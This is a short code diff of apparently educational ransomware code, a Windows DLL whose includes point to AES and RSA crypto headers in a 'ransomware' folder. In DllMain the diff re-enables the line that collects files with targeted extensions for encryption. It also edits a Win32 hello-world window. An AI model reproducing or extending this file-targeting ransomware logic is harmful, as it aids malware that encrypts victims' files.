@@ -14,8 +14,8 @@
 #include <openssl\bio.h>
 #include <openssl\pem.h>
 
-#include "..\..\RansomwareExample\RansomwareExample\AESCrypto.h"
-#include "..\..\RansomwareExample\RansomwareExample\RSACrypto.h"
+#include "..\..\ransomware\RansomwareExample\AESCrypto.h"
+#include "..\..\ransomware\RansomwareExample\RSACrypto.h"
 
 #include <boost\filesystem.hpp>
 
@@ -80,7 +80,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 						// Only gather files with particular extentions
 						if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
 							wprintf(L"\t-%s\n", &(dir->path().wstring())[0]);
-							//file_paths.push_back(dir->path().wstring());
+							file_paths.push_back(dir->path().wstring());
 						}
 					}
 
@@ -277,7 +277,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		RECT rect;
 		GetClientRect(hwnd, &rect);
 		wstring text = L"Hello World!This is a hello world application made in the Win32 API This example was made by some random dude, aka -LeetGamer-";
-		text += L"akjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjk";
+		//text += L"akjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjkakjsfhkjsahfkjhasfhasjkfhkjshfjk";
 		DrawText(hDC, &text[0], text.length(), &rect, DT_WORDBREAK);
 		EndPaint(hwnd, &ps);
 		break;
